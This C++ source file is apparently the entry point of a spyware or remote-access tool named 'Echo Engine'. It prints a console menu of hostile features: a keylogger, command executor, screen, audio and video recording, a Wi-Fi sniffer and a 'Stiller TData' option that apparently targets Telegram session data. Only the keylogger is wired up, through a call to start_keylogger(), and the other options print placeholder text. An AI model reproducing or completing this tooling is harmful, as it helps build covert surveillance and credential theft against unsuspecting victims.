#include <iostream>
#include <string>
#include "../include/EchoEngine/modules/keylogger/main_keylogger.h"
#include "../include/EchoEngine/utils/string_utils.h"

#define RED   "\x1b[31m"
#define GREEN "\x1b[32m"
#define RESET "\x1b[0m"

int main() {

    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);

    StringUtils::enableAnsiColors();

    bool running = true;

    const std::string options =
                                 "WELCOME TO ECHO. CHOOSE THE OPTION:\n"
                                 "[>] 0. - [" GREEN "+" RESET "] echo                     [<]\n"
                                 "[>] 1. - [" GREEN "+" RESET "] k3ylogger                [<]\n"
                                 "[>] 2. - [" RED "-" RESET"] Human presence predictor [<]\n"
                                 "[>] 3. - [" RED "-" RESET"] USB watcher              [<]\n"
                                 "[>] 4. - [" RED "-" RESET"] PC data                  [<]\n"
                                 "[>] 5. - [" RED "-" RESET"] CMD executor             [<]\n"
                                 "[>] 6. - [" RED "-" RESET"] Display a message        [<]\n"
                                 "[>] 7. - [" RED "-" RESET"] Open link                [<]\n"
                                 "[>] 8. - [" RED "-" RESET"] Shutdown                 [<]\n"
                                 "[>] 9. - [" RED "-" RESET"] Screenshot               [<]\n"
                                 "[>] 10. - [" RED "-" RESET"] Video recording         [<]\n"
                                 "[>] 11. - [" RED "-" RESET"] Audio recording         [<]\n"
                                 "[>] 12. - [" RED "-" RESET"] Screen recording        [<]\n"
                                 "[>] 13. - [" RED "-" RESET"] Echo ping (Wi-Fi)       [<]\n"
                                 "[>] 14. - [" RED "-" RESET"] Echo WiFi               [<]\n"
                                 "[>] 15. - [" RED "-" RESET"] Echo sniffer            [<]\n"
                                 "[>] 16. - [" RED "-" RESET"] Stiller TData           [<]\n";


    while (running) {
        std::cout << "\n===== MENU =====" << std::endl;
        std::cout << options << std::endl;

        std::string user_input;
        std::cout << "CHOOSE THE OPTION (or type 'exit'): ";
        std::cin >> user_input;

        if (user_input == "exit") {
            running = false;
            break;
        }

        try {
            switch (int choice = std::stoi(user_input)) {
                 case 0: {
                     std::cout << "Echo Engine is working." << std::endl;
                     break;
                 }
                 case 1: {
                     std::cout << "Running Keylogger..." << std::endl;
                     start_keylogger();
                     break;
                 }
                 case 2: {
                     std::cout << "Predicting presence..." << std::endl;
                     break;
                 }
                 case 3: {
                     std::cout << "Running USB watcher..." << std::endl;
                     break;
                 }
                 case 4: {
                     std::cout << "Watch PC data..." << std::endl;
                     break;
                 }
                 case 5: {
                     std::cout << "Running CMD executor" << std::endl;
                     break;
                 }
                 case 6: {
                     std::cout << "Display a message..." << std::endl;
                     break;
                 }
                 case 7: {
                     std::cout << "Open a link..." << std::endl;
                     break;
                 }
                 case 8: {
                     std::cout << "Do u sure u wanna shutdown the ECHO?" << std::endl;
                     break;
                 }
                 case 9: {
                    std::cout << "Take a screenshot" << std::endl;
                     break;
                 }
                 case 10: {
                     std::cout << "Video recording..." << std::endl;
                     break;
                 }
                 case 11: {
                     std::cout << "Audio recording..." << std::endl;
                     break;
                 }
                 case 12: {
                     std::cout << "Screen recording..." << std::endl;
                     break;
                 }
                 case 13: {
                     std::cout << "Echo ping (Wi-Fi)..." << std::endl;
                     break;
                 }
                 case 14: {
                     std::cout << "Echo WiFi..." << std::endl;
                     break;
                 }
                 case 15: {
                     std::cout << "Echo sniffer..." << std::endl;
                     break;
                 }
                 case 16: {
                     std::cout << "Stiller TData..." << std::endl;
                 }
                 default:
                     std::cout << "Invalid input! Please enter a number from 0 to 15." << std::endl;
                     break;
                }
            } catch (std::exception &e) {

            }
    }


    return 0;
}